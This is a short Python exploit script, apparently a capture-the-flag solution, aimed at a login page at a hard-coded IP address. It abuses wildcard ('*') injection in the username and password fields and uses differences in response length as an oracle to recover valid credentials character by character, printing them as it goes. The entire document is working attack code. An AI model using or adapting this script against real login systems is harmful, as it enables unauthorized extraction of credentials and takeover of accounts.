import requests
import os

CHARS = "a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z,1,2,3,4,5,6,7,8,9,0,!,{,},·,_,$,%,&,/,(,),=,?,¿,+,-"
URL = 'http://165.22.123.95:32443/login'

clear = lambda: os.system('clear')


def send_payload(username, password):

    data = {}
    data['username'] = username
    data['password'] = password

    r = requests.post(URL, data=data)
    return(len(r.content))


if __name__ == "__main__":

    all_chars = CHARS.split(',')

    success_len = send_payload('*', '*')

    max_counter = len(CHARS)
    counter = 0
    username_guess = ''

    # GET USERNAME
    while counter < max_counter-1:
        for c in CHARS:
            counter+=1
            check_len = send_payload(username_guess+c+'*', '*')
            if check_len == success_len:
                username_guess+=c     
                clear()
                print('username: ', username_guess)
                counter = 0
                break
            else: 
                continue


    max_counter = len(CHARS)
    counter = 0
    password_guess = ''

    # GET PASSWORD
    while counter < max_counter-1:
        for c in CHARS:
            counter+=1
            check_len = send_payload('*', password_guess+c+'*')
            if check_len == success_len:
                password_guess+=c     
                clear()
                print('username: ', username_guess)
                print('password: ', password_guess)
                counter = 0
                break
            else: 
                continue
